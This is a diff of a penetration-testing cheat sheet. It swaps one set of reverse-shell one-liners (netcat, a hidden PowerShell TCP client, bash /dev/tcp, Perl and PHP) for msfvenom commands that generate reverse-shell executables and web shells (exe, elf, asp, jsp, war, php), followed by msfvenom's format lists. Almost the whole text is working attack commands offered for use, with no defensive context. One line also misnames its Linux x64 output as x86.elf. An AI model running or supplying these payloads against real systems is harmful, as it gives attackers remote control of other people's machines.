@@ -1519,31 +1519,86 @@ sudo nc -lnvp {PORT}
 #### NC Execute - Server [STEP 2]
 
 ```bash
-# With netcat installed
+# MSFVENOM Payloads
 
-# Usage - Windows
-nc.exe -e cmd.exe {IP ADDRESS} {PORT}
+# Windows
+msfvenom -p windows/shell_reverse_tcp LHOST={LHOST} LPORT=4444 -f exe > x86.exe 
+msfvenom -p windows/x64/shell_reverse_tcp LHOST={LHOST} LPORT=4444 -f exe > x64.exe   
+# Linux
+msfvenom -p linux/x86/shell_reverse_tcp LHOST={LHOST} LPORT=4444 -f elf > x86.elf
+msfvenom -p linux/x64/shell_reverse_tcp LHOST={LHOST} LPORT=4444 -f elf > x86.elf
 
-# Usage - Linux 
-nc {IP ADDRESS} {PORT} –e /bin/bash
+# Web
+msfvenom -p windows/x64/shell_reverse_tcp LHOST={LHOST} LPORT=4444 -f asp > shell.asp
+msfvenom -p java/jsp_shell_reverse_tcp LHOST={LHOST} LPORT=4444 -f raw > shell.jsp
+msfvenom -p java/jsp_shell_reverse_tcp LHOST={LHOST} LPORT=4444 -f war > shell.war
+msfvenom -p php/reverse_tcp LHOST={LHOST} LPORT=4444 -f raw > shell.php
 
-# ===========================================
+Framework Executable Formats [--format <value>]
+===============================================
 
-# Without netcat installed
+    Name
+    ----
+    asp
+    aspx
+    aspx-exe
+    axis2
+    dll
+    elf
+    elf-so
+    exe
+    exe-only
+    exe-service
+    exe-small
+    hta-psh
+    jar
+    jsp
+    loop-vbs
+    macho
+    msi
+    msi-nouac
+    osx-app
+    psh
+    psh-cmd
+    psh-net
+    psh-reflection
+    python-reflection
+    vba
+    vba-exe
+    vba-psh
+    vbs
+    war
 
-# Usage - Windows
-powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("{IP ADDRESS}",{PORT});$s=$client.GetStream();[byte[]]$b=0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2=$sb+"PS "+(pwd).Path+"> ";$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()
+Framework Transform Formats [--format <value>]
+==============================================
 
-# Usage - Linux
-bash -i >& /dev/tcp/{IP ADDRESS}/{PORT} 0>&1
+    Name
+    ----
+    base32
+    base64
+    bash
+    c
+    csharp
+    dw
+    dword
+    hex
+    java
+    js_be
+    js_le
+    num
+    perl
+    pl
+    powershell
+    ps1
+    py
+    python
+    raw
+    rb
+    ruby
+    sh
+    vbapplication
+    vbscript
 
-# Usage - Perl
-perl -e ‘use Socket;$i=”{IP ADDRESS}″;$p={PORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname(“tcp”));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,”>&S”);open(STDOUT,”>&S”);open(STDERR,”>&S”);exec(“/bin/sh -i”);};’
-
-# Usage - PHP
-php -r ‘$sock=fsockopen(“{IP ADDRESS}”,{PORT});exec(“/bin/sh -i <&3 >&3 2>&3”);’
-
-# Alternative - transfer payload via file transfer and execute binary
 
 # {IP ADDRESS}: IP Address of the client from step one (listener)
 # {PORT}: Port of the client from step one (listener)
